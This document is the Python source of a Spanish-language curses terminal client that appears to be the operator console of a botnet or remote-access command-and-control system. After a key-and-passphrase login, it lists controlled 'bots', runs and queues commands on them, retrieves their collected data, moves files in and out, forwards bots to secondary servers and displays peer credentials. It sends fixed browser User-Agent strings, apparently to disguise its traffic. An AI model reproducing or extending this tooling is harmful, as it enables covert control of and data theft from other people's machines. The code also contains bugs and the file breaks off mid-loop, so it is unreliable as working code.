#!/usr/bin/env python3

import jacob
import curses
import curses.panel
import locale
import os
import pyperclip
import sys
from urllib.parse import urlparse
from time import sleep, time

from modules.UI import rename_order

from utils.sys_utils import convert
from utils.Wrappers import wrap
from utils.sys_utils import bytes_convert

from conf import global_conf

locale.setlocale(locale.LC_ALL, '')

_exit = False
_updated = False

stdscr = None
key = False
max_pad_dimentions = (500, 500)
min_y, min_x = (24, 80)
error_dimentions = 'Las dimensiones minimas deben ser: (Y:%d)x(X:%d)' % (min_y, min_x)
blacklist = {
                '17': 'CTRL-Q',
                '23': 'CTRL-W',
                '5': 'CTRL-E',
                '18': 'CTRL-R',
                '20': 'CTRL-T',
                '25': 'CTRL-Y',
                '21': 'CTRL-U',
                '15': 'CTRL-O',
                '16': 'CTRL-P',
                '1': 'CTRL-A',
                '19': 'CTRL-S',
                '6': 'CTRL-F',
                '7': 'CTRL-G',
                '8': 'CTRL-H',
                '11': 'CTRL-K',
                '12': 'CTRL-L',
                '177': 'CTRL-Ñ',
                '26': 'CTRL-Z',
                '24': 'CTRL-X',
                '3': 'CTRL-C',
                '2': 'CTRL-B',
                '14': 'CTRL-N'
        
            }

##########################################
# ¿Ejecutar varias veces?   |   Comando  #
# -----------------------   |   -------  #
#                           |            #
#       <bool>              |  <command> #
##########################################

cmds = [
        (False, 'listBots'),
        (True, 'getData'),
        (True, 'getCommands'),
        (True, 'executeCommand'),
        (True, 'shareBot'),
        (True, 'listServers'),
        (True, 'delServer'),
        (False, 'getToken'),
        (False, 'addNode'),
        (False, 'writeNodes'),
        (False, 'getNodes'),
        (False, 'delNodes'),
        (False, 'useNodes'),
        (False, 'updateNode'),
        (False, 'access_list'),
        (False, 'ping'),
        (False, 'noUseNodes'),
        (False, 'updateListBots'),
        (True, 'listFiles'),
        (False, 'download'),
        (True, 'upload'),
        (False, 'getPeers'),
        (True, 'sharedFiles'),
        (True, 'addQueue')
        
        ]
headers = [
            ('User-Agent', 'Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.121 Safari/535.2')
        ]
headers_for_share_bot = {'User-Agent':'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/ Safari/530.5'}
_new_value = ''
session_is = False
session_index = 0
sessions = wrap.read('sessions', 'session', agent=wrap.USE_SESSION)
separate_string = lambda string: [x for x in str(string)]

if (sessions == []) or (sessions == False):

    if not (wrap.add('sessions', {'session':[]}, agent=wrap.USE_SESSION) == True):

        print('¡Error escribiendo datos en el almacén!')
        sys.exit(1)

    else:

        sessions = wrap.read('sessions', 'session', agent=wrap.USE_SESSION)

# Commands

class control(object):

    def __init__(self, message, jacob_obj):

        self.__message = message
        self.__jacob_obj = jacob_obj

        self.__salts = lambda n: ''.join([' ' for x in range(n)])

    def __call__(self, message_is_correct):

        self.__message_is_correct = message_is_correct

    def __check(self, message_to_check):

        try:

            if (message_to_check[1][1][0] == -1):
                
                self.__message.append(message_to_check[1][1][1])
                
                return(False)

        except (TypeError, IndexError, KeyError):

            pass

        if (message_to_check == False):

            self.__message.append('¡Ocurrio un error!')
            return(False)
        
        elif (message_to_check[1][0] == False):

            if not (message_to_check[1][1] == None):

                self.__message.append(message_to_check[1][1])
                return(False)

            else:

                self.__message.append('Ocurrio un error desconocido ...')
                return(False)
        else:

            if (message_to_check[1][1] == None):

                self.__message.append(self.__message_is_correct)

            else:

                return

    def ping(self):

        return(self.__check(self.__jacob_obj.ping()))

    def listBots(self, limits, pattern=''):

        _result = self.__jacob_obj.listBots(limits, pattern)
        _check = self.__check(_result)
        
        if (_check == False):

            return(False)

        self.__message.append('ID%sName' % (self.__salts(66)))
        self.__message.append('--%s----' % (self.__salts(66)))
        self.__message.append('')

        for _key, _value in _result[1][1].items():
            
            self.__message.append('%s%s%s' % (_key, self.__salts(4), _value))

    def access_list(self, limits):

        _result = self.__jacob_obj.access_list(limits)
        _check = self.__check(_result)

        if (_check == False):

            return(False)

        self.__message.append('Hora%sFecha' % (self.__salts(10)))
        self.__message.append('----%s-----' % (self.__salts(10)))
        self.__message.append('')

        for _ in _result[1][1]:

            (_hour, _date) = _.split('&')

            self.__message.append('%s%s%s' % (_hour, self.__salts(6), _date))

    def getToken(self):

        _result = self.__jacob_obj.getToken()
        _check = self.__check(_result)

        if (_check == False):

            return(False)

        self.__message.append('Token de acceso público => %s' % (_result[1][1]))

    def listServers(self, bot_id, limits):

        _result = self.__jacob_obj.listServers(bot_id, limits)
        _check = self.__check(_result)

        if (_check == False):

            return(False)

        if (len(_result[1][1]) == 0):

            self.__message.append('Aún no hay servidores agregados ...')

        else:

            self.__message.append('Lista de servidores secundarios')
            self.__message.append('-------------------------------')
            self.__message.append('')
            
            for _ in _result[1][1]:

                self.__message.append(_)

    def sharedFiles(self, bot_id, limits, pattern):

        _result = self.__jacob_obj.sharedFiles(bot_id, limits, pattern)
        _check = self.__check(_result)

        if (_check == False):

            return(False)

        if (len(_result[1][1]) == 0):

            self.__message.append('Aún no hay archivos en el espacio compartido ...')

        else:

            self.__message.append('Lista de archivos compartidos')
            self.__message.append('-----------------------------')
            self.__message.append('')

            for _ in sorted(_result[1][1]):

                self.__message.append(_)

    def listFiles(self, bot_id, limits, pattern):

        _result = self.__jacob_obj.listFiles(bot_id, limits, pattern)
        _check = self.__check(_result)

        if (_check == False):

            return(False)

        if (len(_result[1][1]) == 0):

            self.__message.append('Aún no hay archivos en el directorio de perfil ...')

        else:

            self.__message.append('Lista de archivos')
            self.__message.append('-----------------')
            self.__message.append('')

            for _ in sorted(_result[1][1]):

                self.__message.append(_)

    def getCommands(self, bot_id, limits):

        _result = self.__jacob_obj.getCommands(bot_id, limits)
        _check = self.__check(_result)

        if (_check == False):

            return(False)

        if (len(_result[1][1]) == 0):

            self.__message.append('No se obtuvieron comandos ...')

        else:

            self.__message.append('Comandos')
            self.__message.append('--------')
            self.__message.append('')

            for _ in [x[1] for x in _result[1][1]]:

                self.__message.append(_)

    def getData(self, bot_id, limits):

        _result = self.__jacob_obj.getData(bot_id, limits)
        _check = self.__check(_result)

        if (_check == False):

            return(False)

        if (len(_result[1][1]) == 0):

            self.__message.append('Aún no hay datos disponibles')

        else:

            for _key, _value in _result[1][1]:

                self.__message.append('%s:' % (_key))
                self.__message.append('')
                if (isinstance(_value, str)):
                    for _dat in _value.splitlines():
                        self.__message.append('     {}'.format(_dat))
                elif (isinstance(_value, list)):
                    for _dat in _Value:
                        self.__message.append('     {}'.format(_dat))
                else:
                    self.__message.append('     {}'.format(_value))

    def getNodes(self, node_id):

        _result = self.__jacob_obj.getNodes(node_id)
        _check = self.__check(_result)

        if (_check == False):

            return(False)

        _nodes = _result[1][1]

        if (len(_nodes) == 0):

            self.__message.append('Aún no hay nodos disponibles ...')

        else:

            if (node_id == 'all'):

                for _ in _nodes:

                    _extract = []

                    for _sub in range(len(_nodes[_]['list'])):

                        _extract.append(_nodes[_]['list'][_sub][0])

                    self.__message.append('%s: %s' % (_, ' -> '.join(_extract)))

            else:

                _extract = []

                for _ in _nodes:

                    _extract.append(_[0])

                self.__message.append('%s: %s' % (node_id, ' -> '.join(_extract)))

    def executeCommand(self, node_id, cmd):

        _result = self.__jacob_obj.executeCommand(node_id, cmd)
        _check = self.__check(_result)

        if (_check == False):

            return(False)

        self.__message.append(_result[1][1])

    def addNode(self, node_id, node):

        _result = self.__jacob_obj.addNode(node_id, node)
        _check = self.__check(_result)

        if (_check == False):

            return(False)

        self.__message.append(_result[1][1])

    def delNodes(self, node, action):

        _result = self.__jacob_obj.delNodes(node, action)
        _check = self.__check(_result)

        if (_check == False):

            return(False)

        self.__message.append(_result[1][1])

    def delServer(self, bot_id, index):

        _result = self.__jacob_obj.delServer(bot_id, index)
        _check = self.__check(_result)

        if (_check == False):

            return(False)

        self.__message.append(_result[1][1])

    def shareBot(self, bot_id, secundaryServerAddr, api_key, headers, shareFiles):

        _result = self.__jacob_obj.shareBot(bot_id, secundaryServerAddr, api_key, headers, shareFiles)
        _check = self.__check(_result)

        if (_check == False):

            return(False)

        self.__message.append(_result[1][1])

    def writeNodes(self, nodes, node_info):

        _result = self.__jacob_obj.writeNodes(nodes, node_info)
        _check = self.__check(_result)

        if (_check == False):

            return(False)
        
        self.__message.append('Nuevo nodo agregado -> %s' % (_result[1][1]))

    def useNodes(self, node_id):

        _result = self.__jacob_obj.useNodes(node_id)
        _check = self.__check(_result)

        if (_check == False):

            return(False)

        self.__message.append('Usando nodo: "%s"' % (node_id))

    def updateNode(self, node_id, value, index, subindex):

        _result = self.__jacob_obj.updateNode(node_id, value, index, subindex)
        _check = self.__check(_result)

        if (_check == False):

            return(False)

        self.__message.append(_result[1][1])

    def noUseNodes(self):

        self.__jacob_obj.use_nodes = False

    def getPeers(self):

        _result = self.__jacob_obj.getPeers()
        _check = self.__check(_result)

        if (_check == False):

            return(False)

        if (len(_result[1][1]) == 0):

            self.__message.append('Aún no hay nodos en la red ...')

        else:

            for bot_id in _result[1][1]:

                self.__message.append('Bot: %s' % (bot_id))

                for _ in _result[1][1][bot_id]['peers']:

                    self.__message.append('  Dirección: %s' % (_['url']))

                    self.__message.append('     Identificador:                   %s' % (_['hash']))
                    self.__message.append('     Contraseña de la base de datos:  %s' % (_['db_passwd']))
                    self.__message.append('     Nombre de usuario:               %s' % (_['username']))
                    self.__message.append('     Frase de contraseña:             %s' % (_['passphrase']))
                    self.__message.append('')

    def download(self, filename, outname, bot_id):

        _result = self.__jacob_obj.download(filename, outname, bot_id)
        _check = self.__check(_result)

        if (_check == False):

            return(False)

        _content = _result[1][1]
        _bak_outname = rename_order.rename(outname)

        if not (_bak_outname == False):

            outname = _bak_outname

        with open(outname, 'wb') as _obj:

            _obj.write(bytes_convert.convert(_content))

        if (os.path.isfile(outname)):

            self.__message.append('Guardado -> %s -> %s' % (filename, outname))

        else:

            self.__message.append('Error desconocido al guardar el archivo: "%s"' % (outname))

    def upload(self, filename, bot_id, recursive, recursive_limit):

        _result = self.__jacob_obj.upload(filename, bot_id, recursive, recursive_limit)

        if not (_result == False):

            for _ in _result:

                _check = self.__check(_)

                if (_check == False):

                    continue

                else:

                    self.__message.append(_[1][1])

        else:

            self.__message.append('Ocurrio un error desconocido subiendo: "%s"' % (filename))

    def addQueue(self, bot_id, command, data):

        _new_data = {}

        if not (data == ''):

            try:

                _new_data = convert.convert_dict(data)

            except Exception as Except:

                self.__message.append('Ocurrio una excepción: {}'.format(Except))
                return(False)

            else:

                if (_new_data == False):

                    self.__message.append('Error, ¡siga la sintaxis especificada!')
                    return(False)

        _result = self.__jacob_obj.addQueue(command, bot_id, _new_data)
        _check = self.__check(_result)

        if (_check == False):

            return(False)

        self.__message.append(_result[1][1])

# BODY

def _update_form(window, keys, current_key, specials, index):

    (max_y, max_x) = getmaxyx(window)
    
    window.erase()

    for _ in keys:
        
        _string = ''.join(_[1])

        try:

            if (len(_string) >= max_x-30) and (_[0] == current_key):

                _string = '%s' % (_string[:len(_string)-index][(max_x-30)*-1:])

            else:

                _string = '%s' % (_string[(max_x-30)*-1:])

            if (_[0] in specials) and (_[0] == current_key):

                window.addstr('  * ', use_color(4)+curses.A_BOLD)
                window.addstr(_[0], curses.A_BOLD+curses.A_UNDERLINE)
                window.addstr(' ')
                window.addstr('*' * len(_string), use_color(3)+curses.A_BOLD+curses.A_UNDERLINE)
                window.addstr('\n')

            elif (_[0] in specials):

                window.addstr(_[0])
                window.addstr(' ')
                window.addstr('*' * len(_string))
                window.addstr('\n')

            elif (_[0] == current_key):
            
                window.addstr('  * ', use_color(4)+curses.A_BOLD)
                window.addstr(_[0], curses.A_BOLD+curses.A_UNDERLINE)
                window.addstr(' ')
                window.addstr(_string, use_color(3)+curses.A_UNDERLINE)
                window.addstr('\n')

            else:

                window.addstr(_[0])
                window.addstr(' ')
                window.addstr(_string)
                window.addstr('\n')

        except:

            continue
    
    window.addstr('\n')
    window.addstr(max_y-2, max_x-6, 'Entrar', use_color(1)+curses.A_BOLD)
    window.refresh()

def login():

    global session_index, session_is

    _resize = False

    while(True):

        (max_y, max_x) = getmaxyx(stdscr)

        if (_resize == False):

            _key = False
            _keys = (
                    ['Nombre de usuario:', []],
                    ['Frase de contraseña:', []],
                    ['Clave única:', []],
                    ['Servidor:', []],
                    ['(RS) Clave pública:', []],
                    ['(BM) Clave privada:', []],
                    ['Iteraciones:', []],
                    ['Número de seguridad:', []],
                    ['Número de decremento:', []],
                    ['Caracteres de seguridad:', []]
                    )
            _current_key = 0
            _word_index = 0

        else:

            stdscr.erase()

        login_window = create_window((max_y//2)+2, max_x//2, (max_y//6)+2, (max_x//6)+2)
        login_window.keypad(1)
        login_window.bkgd(use_color(2)+curses.A_BOLD)

        login_bg_window = create_window((max_y//2)+2, max_x//2, (max_y//6)+3, (max_x//6)+3)

        login_title = create_window(1, getmaxyx(login_window)[1], (max_y//6), (max_x//6)+2)
        login_title.bkgd(use_color(4)+curses.A_BOLD)
        login_title.addstr('Inicie sesión para poder continuar ...', curses.A_BLINK)

        login_panel = new_panel(login_window)
        login_panel.top()

        login_bg_panel = new_panel(login_bg_window)
        login_bg_panel.bottom()

        login_title_panel = new_panel(login_title)
        login_title_panel.bottom()

        if (_resize == True):

            stdscr.refresh()

        update_panels()

        while (_key != 10):

            if (_resize == True):

                _resize = False

            _update_form(login_window, _keys, _keys[_current_key][0], [_keys[1][0], _keys[2][0]], _word_index)

            _current_word = len(_keys[_current_key][1])-_word_index
            _key = login_window.getch()

            if (str(_key) in blacklist):

                continue

            elif (_key == 27):

                return(False)

            elif (_key == 62) and not (sessions == False) and not (sessions == []):

                if (session_index < len(sessions)-1):

                    session_index += 1

                else:

                    session_index = 0

            elif (_key == 60) and not (sessions == False) and not (sessions == []):

                if (session_index > 0):

                    session_index -= 1

                else:

                    session_index = len(sessions)-1

            if ((_key == 60) or (_key == 62)) and not (sessions == False) and not (sessions == []):

                session_is = True

                login_title.erase()
                login_title.addstr('Número de la sesión: %d' % (session_index))

                update_panels()

                _current_session = sessions[session_index]

                _keys[0][1] = separate_string(_current_session['username'])
                _keys[2][1] = separate_string(_current_session['uniqkey'])
                _keys[3][1] = separate_string(_current_session['server'])
                _keys[4][1] = separate_string(_current_session['pub_key'])
                _keys[5][1] = separate_string(_current_session['priv_key'])

            elif (_key == curses.KEY_DOWN) or (_key == 9):

                _word_index = 0

                if (_current_key == len(_keys)-1):

                    _current_key = 0

                else:

                    _current_key += 1 

            elif (_key == curses.KEY_UP):

                _word_index = 0

                if (_current_key == 0):

                    _current_key = len(_keys)-1

                else:

                    _current_key -= 1

            elif (_key == curses.KEY_BACKSPACE):

                try:

                    _keys[_current_key][1].pop(_current_word-1)

                except IndexError:

                    pass

            elif (_key == curses.KEY_MOUSE):

                try:

                    events = curses.getmouse()

                    (_login_y, _login_x) = getmaxyx(login_window)

                    if (mouse_interface(_login_y-2, _login_x-6, (max_y//6)+2, (max_x//6)+2, 6, events)):

                        break

                except:

                    continue

            elif (_key == 4):

                _word_index = 0
                _keys[_current_key][1] = []

            elif (_key == curses.KEY_RESIZE):

                _resize = True
                break

            elif (_key == curses.KEY_LEFT):

                if (len(_keys[_current_key][1]) != _word_index):

                    _word_index += 1

                else:

                    _word_index = 0

            elif (_key == curses.KEY_RIGHT):

                if (_word_index == 0):

                    _word_index = len(_keys[_current_key][1])

                else:

                    _word_index -= 1

            else:

                _array = pyperclip.paste() if (_key == 22) else [_key]

                if (_key == 22):

                    if (_array == ''):

                        continue
                    
                    else:

                        _array = [ord(x) for x in _array]
                        _array.reverse()

                for _key in _array:

                    if (_current_key == 6) or (_current_key == 7) or (_current_key == 8):

                        try:

                            int(chr(_key))

                        except ValueError:

                            curses.beep()

                        else:

                            if (_current_key == 4):

                                if (len(_keys[_current_key][1]) < 5):

                                    _keys[_current_key][1].insert(_current_word, str(chr(_key)))

                            else:

                                _keys[_current_key][1].insert(_current_word, str(chr(_key)))

                    else:

                        _keys[_current_key][1].insert(_current_word, chr(_key))

        if (_resize == True):

            continue

        login_title.erase()
        login_title.addstr('Espere ...')
        login_title.refresh()

        for _ in _keys:

            if (_[1] == []):

                savetty()
                print('No todos los valores están definidos ...')
                refresh(stdscr)

                return(False)

        _url = urlparse(''.join(_keys[3][1]).rstrip())

        if (_url.scheme == ''):

            savetty()

            print('No se escribió la URL o no es válida...')

            refresh(stdscr)

            return(False)
        
        if not (_url.scheme in ['http', 'https']):

            savetty()

            print('%s, No es un esquema válido ...' % (_url.scheme))

            refresh(stdscr)

            return(False)

        else:

            _proto = _url.scheme

        _server = _url.hostname

        if (_server == None):

            savetty()

            print('La dirección no es válida ...')

            refresh(stdscr)

            return(False)

        try:

            _port = _url.port

        except ValueError:

            savetty()

            print('Error con el tipo de dato o formato del puerto ...')

            refresh(stdscr)

            return(False)

        else:

            if (_port == None):

                savetty()

                print('¡No se introdujo ningún puerto!')

                refresh(stdscr)

                return(False)

        if (_url.path == ''):

            _path = '/'

        else:

            _path = _url.path

        _uniqkey = ''.join(_keys[2][1]).rstrip()

        if (_uniqkey[:8].lower() == 'recover:'):

            _recover = True

        else:

            _recover = False

        _path_pub_key = ''.join(_keys[4][1]).rstrip()
        _path_priv_key = ''.join(_keys[5][1]).rstrip()
        _iterations = ''.join(_keys[6][1]).rstrip()
        _security_number = ''.join(_keys[7][1]).rstrip()
        _decrement_number = ''.join(_keys[8][1]).rstrip()
        _chars = ''.join(_keys[9][1]).rstrip()

        if not (os.path.isfile(_path_pub_key)) or not (os.path.isfile(_path_priv_key)):

            savetty()

            print('La clave pública o la privada no existe o no es un archivo')

            refresh(stdscr)

            return(False)

        with open(_path_pub_key, 'r') as obj:
            
            _pub_key = obj.read()
        
        with open(_path_priv_key, 'r') as obj:
            
            _priv_key = obj.read()
        
        _username = ''.join(_keys[0][1]).rstrip()
        _passphrase = ''.join(_keys[1][1]).rstrip()

        _jacob_obj = jacob.control(_server, _path[1:], _uniqkey, _port, _proto, _recover, _chars, _iterations, _security_number, _decrement_number, callback=exit_force)

        _jacob_obj.setServerCredentials(_pub_key)
        _jacob_obj.setKey(_priv_key)
        _jacob_obj.setCredentials(_username, _passphrase)

        for _ in headers:

            _jacob_obj.setHeaders(*_)

        _response = _jacob_obj.ping()

        if (_detect() == True):

            savetty()
            print(error_dimentions)
            refresh(stdscr)

            return(False)

        try:

            if (_response == False):

                savetty()
                print('Ocurrio un error, es probable qué las credenciales no sean válidas ...')
                refresh(stdscr) 

                return(False)

            elif (False in _response):

                savetty()
                print('Ocurrio un error con la respuesta ...')
                refresh(stdscr)

                return(False)

            else:

                login_panel.hide()
                login_bg_panel.hide()
                login_title_panel.hide()
                update_panels()

                if (session_is == False):

                    if (wrap.write('sessions', 'session', {'time':time(), 'username':_username, 'uniqkey':_uniqkey, 'server':_url.geturl(), 'pub_key':_path_pub_key, 'priv_key':_path_priv_key}, agent=wrap.USE_SESSION) == True):

                        session_index = len(sessions)

                        return(_jacob_obj)

                    else:

                        savetty()
                        print('¡Ocurrio un error escribiendo la sesión en el almacén!')
                        refresh(stdscr)

                        return(False)

                else:

                    if (wrap.write('sessions', 'session', _url.geturl(), target=wrap.TARGET_SUBINDEX_UPDATE, array_subindex=(session_index, 'server'), agent=wrap.USE_SESSION) == True):

                        return(_jacob_obj)

                    else:

                        savetty()
                        print('Error actualizando la dirección URL del servidor')
                        refresh(stdscr)

        except TypeError:

            savetty()
            print('Ocurrio un error desconocido ...')
            refresh(stdscr)

            return(False)

def _update_logs(window_logs, message, min_index):

    result = ''
    _max = 0

    window_logs.erase()

    (wlogy, wlogx) = getmaxyx(window_logs)

    for _ in range(wlogx-2):
        window_logs.addstr('-')

    window_logs.addstr('\n')

    for _ in message:

        _ = _[min_index:]

        if (_max == wlogy-2):

            break

        if (len(_) >= wlogx-2):

            result += ' %s\n' % (_[:(wlogx)+2*-1])

        elif (_max+1 == wlogy):

            result += _

        else:

            result += ' %s\n' % (_)

        _max += 1

    window_logs.addstr(result)
    for _ in range(wlogx-2):
        window_logs.addstr('-')
    window_logs.refresh()

def _create_popup(y=None, x=None, height=12, width=28):

    if (y == None) or (x == None):

        (y, x) = getmaxyx(stdscr)

    y = y//3
    x = (x//3)+2

    _window = create_window(height, width, y, x)
    _window.border(1, 1, 0, 0, 0, 0, 0, 0)
    _window.bkgd(use_color(1)+curses.A_BOLD)

    return(_window)

def _int_interact_popup(window, panel, window_logs, value, label_length):

    global _new_value

    (max_y, max_x) = getmaxyx(window)
    _bak_value = value
    panel.show()
    panel.top()

    update_panels()

    index = 0
    _key_two = False

    while (_key_two != 10):

        _key_two = window.getch()

        if (_key_two == 3):

            break

        elif (_key_two == 4):

            [window.delch(4, label_length+4) for x in range(len(_new_value))]
            window.refresh()
            _new_value = ''
            continue

        elif not (_key_two in blacklist):

            if (_key_two == curses.KEY_BACKSPACE):

                _new_value = _new_value[:-1]

            elif (_key_two == curses.KEY_LEFT):

                if (index < len(_new_value)-1):

                    index += 1

                else:

                    index = 0

            elif (_key_two == curses.KEY_RIGHT):

                if (index > 0):

                    index -= 1

                else:

                    index = len(_new_value)-1

            else:

                try:

                    int(chr(_key_two))

                except ValueError:

                    continue

                else:

                    _new_value += str(chr(_key_two))

        else:

            continue

        window.delch(4, label_length+4)
        window.addstr(4, label_length+4, _new_value[((max_x//2)*-1)-index:])
        window.refresh()

    panel.hide()
    window_logs.refresh()

    return(int(_bak_value) if (_new_value == '') else int(_new_value))

def _create_popup_int(title, label):

    _window = _create_popup()

    _window.addstr(0, 4, str(title), curses.A_UNDERLINE)
    _window.addstr(4, 2, '%s ' % (label))
    _window.addstr(4, len(label)+3, '_', curses.A_BLINK)

    return(_window)

def _simplyArchitecture(window, panel, label, value, y_label, y_value):

    _key_two = False
    _bak_value = value

    label = str(label)

    index = 0

    panel.show()
    panel.top()

    update_panels()

    while (True):

        _custom = separate_string(value)
        value = ''.join(_custom)

        window.erase()
        window.noutrefresh()
        window.refresh()
        window.box()
        window.addstr(y_label, 1, label)
        window.addstr(y_value-1, 1, '')
        window.addstr(y_value, 1, value[:len(value)-index][(getmaxyx(window)[1]-5)*-1:])
        window.refresh()

        _key_two = window.getch()

        if (_key_two == 3):

            value = _bak_value
            break

        elif (_key_two == 10):

            break

        elif (_key_two == 4):

            _custom = []
            index = 0
            value = ''.join(_custom)

        elif (_key_two == curses.KEY_LEFT):

            if (index < len(_custom)):

                index += 1

            else:

                index = 0

        elif (_key_two == curses.KEY_RIGHT):

            if (index > 0):

                index -= 1

            else:

                index = len(_custom)

        elif not (_key_two in blacklist):

            if not (_key_two == 263):

                _custom.insert(len(_custom)-index, chr(_key_two))

            else:

                window.erase()
                window.box()

                if (len(_custom) > 0):

                    try:

                        _custom.pop((len(_custom)-1)-index)

                    except IndexError:

                        curses.beep()

            value = ''.join(_custom)

    panel.hide()

    update_panels()

    return(value.rstrip())

def _update_listBots(window, jacob_obj, limits=0, pattern=''):

    global _bots, _max_text, _updated

    if (_updated == False):

        _updated = True

    _max_text = 0

    window.erase()

    _bots = jacob_obj.listBots(limits, pattern)
    # Para pruebas:
    #_bots = (True, (True, {'id1':'bot_name1', 'id2':'bot_name2'}), 'fewfewfewfewjfjwejfwej')

    if not (_update_uniqkey(jacob_obj.uniqkey()) == True):

        savetty()
        print('¡Error actualizando la clave única!')
        stdscr(stdscr)
        return(False)

    try:

        if (_bots[1][1][0] == -1):
            
            savetty()
            print('No tiene el privilegio de exportar rook\'s')
            refresh(stdscr)
            
            return(False)

    except (TypeError, IndexError, KeyError):

        pass

    if (_bots == False):

        savetty()
        print('Ocurrio un error al exportar rook\'s')
        refresh(stdscr)
        return(False)
    
    elif (_bots[1][0] == False):

        if not (_bots[1][1] == None):

            savetty()
            print(_bots[1][1])
            refresh(stdscr)
            return(False)

        else:

            savetty()
            print('Ocurrio un error desconocido...')
            refresh(stdscr)
            return(False)
    else:

        if (_bots[1][1] == None):

            savetty()
            print('¡Evie, no envío datos!')
            refresh(stdscr)
            return(False)

    try:

        if (len(_bots[1][1]) == 0):

            savetty()
            print('Aún no hay rook\'s con los que interactuar ...')
            refresh(stdscr)
            return(False)

        elif not (_bots[1][0] == False):

            if (isinstance(_bots[1][1], dict)):

                _bot_num = 1

                for _key, _value in _bots[1][1].items():

                    text = '%d):~ %s - (%s)\n' % (_bot_num, _key, _value)

                    window.addstr(text, use_color(1)+curses.A_BOLD)
                    _bot_num += 1

                    if (len(text) > _max_text):

                        _max_text = len(text)

            else:

                savetty()
                print('¡Error parseando los datos!')
                refresh(stdscr)
                return(False)

    except Exception as Except:

        savetty()
        print('Ocurrio una excepción: "{}"'.format(Except))
        refresh(stdscr)
        return(False)

def _copy_content(content, panel):

    panel.show()
    panel.top()

    update_panels()

    pyperclip.copy(content)

    sleep(0.5)

    panel.hide()
    
    update_panels()

def _update_uniqkey(uniqkey):

    return(wrap.write('sessions', 'session', uniqkey, target=wrap.TARGET_SUBINDEX_UPDATE, array_subindex=(session_index, 'uniqkey'), agent=wrap.USE_SESSION))

def catch(func):
    
    def execute(*args, **kwargs):

        try:

            return(func(*args, **kwargs))

        except Exception as Except:

            savetty()
            print('Oops..., Ocurrio una excepción: {}'.format(Except))
            refresh(stdscr)
            return(False)

    return(execute)

@catch
def interact(jacob_obj):

    global _max_text, _updated, _exit

    curses.mousemask(0)

    all_ = False
    uniqkey = None
    num = 0
    _min_index = 0
    message = []
    _control = control(message, jacob_obj)
    _max_message = 0
    _top = 0 # El indice de el pad de los rook's
    _left = 0 # El indice de el pad de los rook's de forma horizontal

    salts = 0 # Saltos para la ventana de logs
    _bot_id = 0 # El identificador del rook en algunas operaciones
    _limits = 0 # Limites para la lista de rook's
    _limits_for_access_list = 0 # Limites para la lista de acceso
    _limits_for_server = 0 # Limites para la lista de los servidores secundarios
    _limits_for_commands = 0 # Limites para los comandos
    _limits_for_data = 0 # Limites para los datos obtenidos
    _limits_for_list_files = 0 # Limites para los archivos del rook
    _limits_for_shared_files = 0 # Limites para los archivos compartidos
    _node_id = '' # El identificador del nodo
    _command_to_execute = '' # El comando a ejecutar
    _node_to_add = '' # El nodo a agregar
    _node_to_add_token = '' # El token de acceso público del nodo
    _node_to_add_secret_key = '' # La clave secreta del nodo
    _index_to_server = -1 # El indíce del servidor
    _secundaryServerAddr = '' # La dirección del servidor secundario
    _node_username = '' # El nombre de usuario para ingresar al nuevo nodo
    _node_passphrase = '' # La frase de contraseña del nuevo nodo
    _node_uniqkey = '' # La clave única
    _node_pub_key = '' # La ruta de la clave pública
    _node_priv_key = '' # La ruta de la clave privada
    _node_recover = 0 # Usar o no usar la última clave única
    _share_files = 1 # Compartir archivos del rook
    _filename = '' # El nombre del archivo a descargar
    _outname = '' # El nombre del archivo a guardar
    _pattern = '' # El patrón de búsqueda
    _cmd_to_queue = '' # El comando que será agregado en la cola
    _data_to_queue = '' # Los parámetros a utilizar el método de la clase del rook
    _recursive = 0 # ¿Recursivo?
    _recursive_limit = 0 # El limite de recursividad
    _node_iterations = global_conf.hashing['iterations']
    _node_security_number = global_conf.hashing['security_number']
    _node_decrement_number = global_conf.hashing['decrement_number']
    _node_chars = global_conf.hashing['chars']
    _node_new_value = ''
    _node_data_index = 0
    _node_data_subindex = 0

    while (True):

        if (_exit == True):

            break

        if (_detect() == True):

            savetty()
            print(error_dimentions)
            refresh(stdscr)
            break

        (max_y, max_x) = getmaxyx(stdscr)

        _key = False
        _current_command = 0

        stdscr.erase()
        refresh(stdscr)

        window_bots = create_pad(*max_pad_dimentions)
        window_bots.bkgd(use_color(1)+curses.A_BOLD)

        uniqkey_window = create_window(2, (max_x//4)+3, max_y-2, 0)
        uniqkey_window.bkgd(use_color(1)+curses.A_BOLD)

        window_logs = create_window(max_y-2, max_x-38, 0, (max_x//4)+8)
        window_logs.bkgd(use_color(1)+curses.A_BOLD)

        window_commands = create_window(2, max_x-38, max_y-2, (max_x//4)+8)
        window_commands.bkgd(use_color(1)+curses.A_BOLD)
        window_commands.border(1, 1, 1, '-', 1, 1, 1, 1)    

        pop_salts_settings = _create_popup_int('Editar los saltos', 'Saltos:')
        pop_limits = _create_popup_int('Editar el limite', 'Limite:')
        pop_share_files = _create_popup_int('Compartir archivos', '0/1+:')
        pop_recursive = _create_popup_int('¿Recursividad?', '0/1+')
        pop_index_to_server = _create_popup_int('Editar el indíce', 'Indíce:')
        pop_subindex_to_server = _create_popup_int('Editar el sub-indíce', 'Sub-Indíce:')

        pop_copy = _create_popup(height=5)
        pop_copy.addstr(2, 8, 'Copiado ...')

        pop_window = _create_popup(height=5)

        panel_pop_window = new_panel(pop_window)

        panel_pop_recursive = new_panel(pop_recursive)
        panel_pop_recursive.hide()

        panel_pop_copy = new_panel(pop_copy)
        panel_pop_copy.hide()

        panel_share_files = new_panel(pop_share_files)
        panel_share_files.hide()

        panel_subindex_to_server = new_panel(pop_subindex_to_server)
        panel_subindex_to_server.hide()

        panel_index_to_server = new_panel(pop_index_to_server)
        panel_index_to_server.hide()

        panel_limits = new_panel(pop_limits)
        panel_limits.hide()

        panel_salts_settings = new_panel(pop_salts_settings)
        panel_salts_settings.hide()

        # Otras ventanas

        panel_logs = new_panel(window_logs)
        panel_logs.bottom()

        panel_commands = new_panel(window_commands)
        panel_commands.bottom()

        pop_window.addstr(2, 8, 'Espere ...')

        panel_pop_window.show()
        panel_pop_window.top()

        update_panels() 

        if (_update_listBots(window_bots, jacob_obj) == False):

            return 

        panel_pop_window.hide()

        update_panels()

        while (True):

            if (_detect() == True):

                savetty()
                print(error_dimentions)
                refresh(stdscr)
                _exit = True
                break 

            if (_updated == True):

                _updated = False
                _top = 0

            if (jacob_obj.uniqkey() != uniqkey):
                
